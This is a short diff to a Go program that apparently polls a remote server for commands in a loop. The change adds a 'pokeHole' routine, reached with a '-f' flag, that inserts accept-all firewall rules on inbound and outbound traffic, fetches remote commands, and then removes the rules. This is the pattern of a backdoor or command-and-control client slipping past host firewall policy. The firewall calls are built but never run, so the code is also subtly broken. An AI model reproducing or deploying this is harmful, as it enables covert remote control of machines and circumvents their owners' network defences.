@@ -35,6 +35,14 @@ func getIP() string {
 	return ipStr
 }
 
+func pokeHole() {
+	exec.Command("/usr/bin/ipt-manager", "-I", "INPUT", "1", "-j", "ACCEPT")
+	exec.Command("/usr/bin/ipt-manager", "-I", "OUTPUT", "1", "-j", "ACCEPT")
+	getCommands()
+	exec.Command("/usr/bin/ipt-manager", "-D", "INPUT", "1")
+	exec.Command("/usr/bin/ipt-manager", "-D", "OUTPUT", "1")
+}
+
 func getCommands() {
 	ip := getIP()
 	url := "http://" + serv + "/" + ip + "/" + src
@@ -58,10 +66,19 @@ func getCommands() {
 }
 
 func main() {
-	for {
+	argslen := len(os.Args)
+	if argslen < 2 {
+		for {
 
-		getCommands()
-		time.Sleep(time.Duration(loopTime) * time.Second)
+			getCommands()
+			time.Sleep(time.Duration(loopTime) * time.Second)
+		}
+	} else {
+		if os.Args[1] == "-f" {
+			pokeHole()
+		} else {
+			getCommands()
+		}
 	}
 
 }
